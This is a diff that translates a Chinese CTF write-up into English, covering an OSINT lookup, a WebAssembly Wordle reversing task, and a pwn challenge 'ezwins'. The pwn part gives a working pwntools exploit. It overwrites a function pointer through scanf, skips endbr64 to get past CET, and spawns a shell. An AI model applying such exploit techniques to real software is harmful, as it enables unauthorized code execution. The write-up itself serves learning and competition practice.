@@ -1,6 +1,6 @@
 # beginner
 ## radioactive
-根據圖片前往網站查詢站點編號為 2154006 的塔台
+Based on the image, go to the website and look up tower site number 2154006
 https://www.rfnsa.com.au/2154006/detail
 ![image](https://hackmd.io/_uploads/ryMbBcoigl.png)
 **Flag: K17{-33.717,160.987}**
@@ -8,33 +8,33 @@ https://www.rfnsa.com.au/2154006/detail
 
 ## daily re
 
-* 題目是一個 WebAssembly (`words.wasm`) + JavaScript 的 Wordle 類型遊戲。
-* 介面會根據當天的 `DAY_NUMBER` 與 `DAY_KEY` 來呼叫 `get_word`，取得答案單字。
-* 題目要求：找出第 72、73、74 天的答案，格式 `K17{word1, word2, word3}`。
-* 題目提示：Day 17 的答案是 `zonal`。
+* The challenge is a Wordle-like game built with WebAssembly (`words.wasm`) + JavaScript.
+* The interface calls `get_word` using the current day's `DAY_NUMBER` and `DAY_KEY` to obtain the answer word.
+* Task: find the answers for days 72, 73, and 74, in format `K17{word1, word2, word3}`.
+* Hint: the Day 17 answer is `zonal`.
 
 
-### 初步分析
+### Initial Analysis
 
-1. 在 `index.html` 中可以看到：
+1. In `index.html`, you can see:
 
    ```js
    Module.ccall('get_word', 'string', ['number','string'], [DAY_NUMBER-1, DAY_KEY])
    ```
 
-   這說明了 `get_word` 的呼叫方式。
-2. 直接呼叫 `get_word` 拿 72/73/74 會得到空字串，說明有額外驗證機制。
-3. 反編譯 `words.wasm` 發現 `get_word` 會用索引與 key 計算一個位置，並驗證 key 與某個表格中的值。這代表遊戲答案存在於 data section。
+   This shows how `get_word` is called.
+2. Directly calling `get_word` for 72/73/74 returns an empty string, indicating additional validation.
+3. Decompiling `words.wasm` shows `get_word` computes a position from index and key, then validates the key against a table value. This implies the game answers are stored in the data section.
 
-### 關鍵觀察
+### Key Observation
 
-在 `words.wasm` 的 data 區段中，出現了清晰的結構：
+In the `words.wasm` data section, a clear structure appears:
 
 ```
 (index) (hashkey) (word)
 ```
 
-例如：
+For example:
 
 ```
 \11 70e7726a9b8d5e65a6dbb19cf784ad5a zonal
@@ -43,31 +43,31 @@ https://www.rfnsa.com.au/2154006/detail
 ...
 ```
 
-這裡可以直接看到：
+From this, we can directly see:
 
-* Day 17 (`0x11`，十進位 17) 的單字就是 `zonal`。
-* 後面每一行依序對應 Day 18, 19, …。
+* Day 17 (`0x11`, decimal 17) is `zonal`.
+* Each subsequent line corresponds to Day 18, 19, ... in order.
 
-直接數下去：
+Count forward directly:
 
 * `0x11` (17) = zonal
-* 所以 Day N 的字就在 tag `0xNN` 後面。
+* So Day N's word appears after tag `0xNN`.
 
-找到：
+Found:
 
 * `0x48` (72) → `limbo`
 * `0x49` (73) → `urban`
 * `0x4a` (74) → `fiber`
 
-### 總結
+### Summary
 
-這題的陷阱在於：表面上 `get_word` 會檢查 key，不讓我們直接呼叫；但實際上遊戲答案明文存放在 `wasm` data 段，只要翻看或 dump 出來，就能順利找到所有日子的單字。
+The trick is that although `get_word` appears to enforce key checks, the actual answers are stored in plaintext in the wasm data segment. By inspecting or dumping it, all daily words can be recovered.
 **Flag: K17{limbo, urban, fiber}**
 
 ## ezwins
-#### 1. 初步分析
+#### 1. Initial Analysis
 
-首先，我們對提供的二進位檔案 chal 進行基本檢查。
+First, run basic checks on the provided binary `chal`.
 
 ```bash
 $ checksec chal
@@ -80,9 +80,9 @@ $ checksec chal
     IBT:        Enabled
 ```
 
-從 `checksec` 的結果可以看到，這是一個 64 位元的 ELF 檔案，主要的保護機制都已開啟，包括 NX、Stack Canary，甚至還有較新的 `SHSTK` (Shadow Stack) 和 `IBT` (Indirect Branch Tracking)。不過，PIE (Position-Independent Executable) 沒有開啟，這意味著程式和函式的位址在每次執行時都是固定的，大大降低了利用難度。
+From `checksec`, this is a 64-bit ELF with major protections enabled, including NX, Stack Canary, and even newer `SHSTK` (Shadow Stack) and `IBT` (Indirect Branch Tracking). However, PIE is disabled, so code/function addresses are fixed each run, which significantly lowers exploit difficulty.
 
-接著，使用 IDA Pro 或 Ghidra 進行反組譯，我們可以看到 `main` 函式的 C 偽代碼如下：
+Next, decompile with IDA Pro or Ghidra. The `main` pseudocode is:
 
 ```c
 int __fastcall main(int argc, const char **argv, const char **envp)
@@ -92,39 +92,39 @@ int __fastcall main(int argc, const char **argv, const char **envp)
   char v8;      // [rsp+30h] [rbp-30h] - Age variable
   __int64 (__fastcall *v9)(...); // [rsp+31h] [rbp-2Fh] - Function pointer
 
-  v9 = print_greeting; // v9 指向 print_greeting 函式
+  v9 = print_greeting; // v9 points to print_greeting
   puts("What's your name?");
-  fgets(s, 32, stdin); // 讀取名字
+  fgets(s, 32, stdin); // read name
   puts("How old are you?");
-  __isoc99_scanf(" %lld", &v8); // 讀取年齡
+  __isoc99_scanf(" %lld", &v8); // read age
   // ...
-  ((void (__fastcall *)(...))v9)(...); // 呼叫 v9 指向的函式
+  ((void (__fastcall *)(...))v9)(...); // call function pointed by v9
   return 0;
 }
 ```
 
-程式的邏輯很簡單：
-1.  初始化函式指標 `v9`，使其指向 `print_greeting` 函式。
-2.  讀取使用者的名字到緩衝區 `s`。
-3.  讀取使用者的年齡到變數 `v8`。
-4.  呼叫 `v9` 指向的函式。
+Program logic is simple:
+1. Initialize function pointer `v9` to `print_greeting`.
+2. Read user name into buffer `s`.
+3. Read user age into variable `v8`.
+4. Call the function pointed to by `v9`.
 
-同時，我們在程式中發現一個名為 `win` 的函式，它會執行 `system("/bin/sh")`，給我們一個 shell。我們的目標就是想辦法讓程式執行 `win` 函式。
+There is also a `win` function that executes `system("/bin/sh")`, giving a shell. Our goal is to make the program call `win`.
 
-#### 2. 漏洞發掘
+#### 2. Vulnerability Discovery
 
-從偽代碼和堆疊佈局中，我們可以發現一個典型的堆疊溢位漏洞：
+From pseudocode and stack layout, we find a classic stack overflow:
 
-*   `v8` 位於 `[rbp-30h]`。
-*   函式指標 `v9` 位於 `[rbp-2Fh]`。
+*   `v8` is at `[rbp-30h]`.
+*   Function pointer `v9` is at `[rbp-2Fh]`.
 
-`v8` 和 `v9` 在堆疊上是緊密相鄰的。`__isoc99_scanf(" %lld", &v8)` 會讀取一個 64 位元（8 bytes）的長整型到 `v8` 的位址。這意味著，當我們輸入年齡時，這 8 個位元組會從 `[rbp-30h]` 開始寫入，一直覆蓋到 `[rbp-29h]`。這個範圍剛好完全覆蓋了 `v9` 的低 7 個位元組。
+`v8` and `v9` are adjacent on the stack. `__isoc99_scanf(" %lld", &v8)` writes an 8-byte integer at `v8`, so age input writes from `[rbp-30h]` to `[rbp-29h]`, fully overwriting the lower 7 bytes of `v9`.
 
-這就是我們的攻擊向量：**透過輸入一個精心構造的 "age"，我們可以覆寫函式指標 `v9`，使其指向 `win` 函式。**
+This is the attack vector: **by crafting the "age" input, we can overwrite function pointer `v9` to point to `win`.**
 
-#### 3. 繞過 CET (Control-Flow Enforcement Technology)
+#### 3. Bypassing CET (Control-Flow Enforcement Technology)
 
-在嘗試直接跳轉到 `win` 函式時，我們發現 `win` 函式的第一條指令是 `endbr64`。
+When attempting a direct jump to `win`, we see its first instruction is `endbr64`.
 
 ```assembly
 0x4011f6 <win+0>: endbr64
@@ -132,31 +132,31 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 ...
 ```
 
-這是 Intel CET 安全機制的一部分。如果程式透過間接跳轉（例如呼叫函式指標）跳到一個不是 `endbr64` 的位址，CPU 會觸發一個異常，導致程式崩潰。
+This is part of Intel CET. If an indirect branch (like a function pointer call) targets an address without `endbr64`, the CPU raises an exception and the program crashes.
 
-幸運的是，我們只需要跳過這條指令，直接跳到函式真正開始執行的地方，也就是 `0x4011fa` (`win+4`)，就可以繞過這個保護。
+Fortunately, we can skip this instruction and jump to `0x4011fa` (`win+4`), where the function body begins, bypassing this protection.
 
-#### 4. 攻擊流程
+#### 4. Exploit Flow
 
-我們的最終攻擊策略如下：
+Final exploit strategy:
 
-1.  **處理 Name 輸入**：為了避免 `fgets` 對堆疊造成任何干擾，我們只輸入一個換行符 (`\n`)。`fgets` 會讀取它，然後在緩衝區開頭寫入一個空位元組 `\x00`，這樣就不會影響到後面的 `v8` 和 `v9`。
+1.  **Name input handling**: send only a newline (`\n`) so `fgets` writes a null byte `\x00` at the start of the buffer and does not interfere with `v8`/`v9`.
 
-2.  **構造 Age Payload**：
-    *   我們的目標位址是 `win+4`，即 `0x4011fa`。
-    *   `v9` 的原始值是 `print_greeting` 的位址 `0x401210`。
-    *   `scanf` 會從 `[rbp-30h]` 開始寫入 8 個位元組。
-    *   我們需要構造一個 8-byte 的 payload，當它被當作整數寫入時，能將 `v9` 的值變為 `0x4011fa`。
-    *   Payload 的第一個 byte 會覆蓋 `[rbp-30h]`，我們可以隨意填充（例如用 `\x00`）。
-    *   Payload 的後 7 個 byte 會覆蓋 `v9` 的低 7 個 byte。我們將 `0x4011fa` 的低 7 個 byte 填入即可。
+2.  **Build the age payload**:
+    *   Target address is `win+4`, i.e. `0x4011fa`.
+    *   Original `v9` is `print_greeting` at `0x401210`.
+    *   `scanf` writes 8 bytes starting at `[rbp-30h]`.
+    *   Build an 8-byte payload that, when written as an integer, changes `v9` to `0x4011fa`.
+    *   The first payload byte overwrites `[rbp-30h]` and can be arbitrary (e.g., `\x00`).
+    *   The remaining 7 bytes overwrite the lower 7 bytes of `v9`, so we place the lower 7 bytes of `0x4011fa`.
 
-    因此，我們的 payload 構造如下：
+    So the payload is:
     `payload_bytes = b'\x00' + p64(win_addr + 4)[:7]`
 
-3.  **取得 Flag**：
-    *   將這個 payload 轉換為整數，作為 "age" 發送。
-    *   程式會呼叫被我們覆寫後的 `v9`，也就是 `win+4`，成功執行 `system("/bin/sh")`。
-    *   進入互動式 shell 後，執行 `ls -la /` 找到 flag 檔案（通常是 `/flag`），再用 `cat /flag` 讀取內容。
+3.  **Get the flag**:
+    *   Convert this payload to an integer and send it as "age".
+    *   The program calls overwritten `v9` (`win+4`), successfully executing `system("/bin/sh")`.
+    *   In the interactive shell, run `ls -la /` to locate the flag file (usually `/flag`) and read it with `cat /flag`.
 
 
 ```python
@@ -177,29 +177,29 @@ context.log_level = 'info'
 
 win_addr = None
 if 'win' in elf.symbols:
-    # 跳過 endbr64 指令
+    # Skip endbr64 instruction
     win_addr_offset = elf.symbols['win'] + 4
     log.info(f'found symbol win at 0x{elf.symbols["win"]:x}')
     log.info(f'Using win address with offset: 0x{win_addr_offset:x}')
     win_addr = win_addr_offset
 else:
-    log.error('找不到 win 符號')
+    log.error('win symbol not found')
     exit(1)
 
 def solve(io):
-    # 1. 發送一個換行符，避免 fgets 影響後續的堆疊
+    # 1. Send a newline to prevent fgets from affecting the following stack data
     name_payload = b'\n'
     io.sendafter(b"What's your name?", name_payload)
     log.info(f"Sent name: {name_payload!r}")
 
-    # 2. 構造 age payload
-    # v9 的原始值是 0x401210
-    # 我們的目標是 0x4011fa
-    # scanf 從 &v8 ([rbp-30h]) 開始寫入 8 bytes
-    # v9 在 [rbp-2Fh]，所以 scanf 的第 2-8 bytes 會覆蓋 v9 的低 7 bytes
-    # 我們需要構造一個 payload，其效果等同於將 v9 的低位覆寫
+    # 2. Construct age payload
+    # Original v9 value is 0x401210
+    # Our target is 0x4011fa
+    # scanf writes 8 bytes starting at &v8 ([rbp-30h])
+    # v9 is at [rbp-2Fh], so bytes 2-8 from scanf overwrite v9's lower 7 bytes
+    # We need a payload that effectively overwrites v9's lower bytes
     
-    # 構造 payload: [任意1 byte] + [目標地址的低 7 bytes]
+    # Build payload: [any 1 byte] + [lower 7 bytes of target address]
     payload_bytes = b'\x00' + p64(win_addr)[:7]
     age_as_int = u64(payload_bytes)
 
@@ -207,7 +207,7 @@ def solve(io):
     log.info(f"Sent age payload bytes: {payload_bytes!r}")
     log.info(f"Sent age as int: {age_as_int}")
 
-    # 接收 flag
+    # Receive flag
     io.interactive()
 
 if __name__ == "__main__":
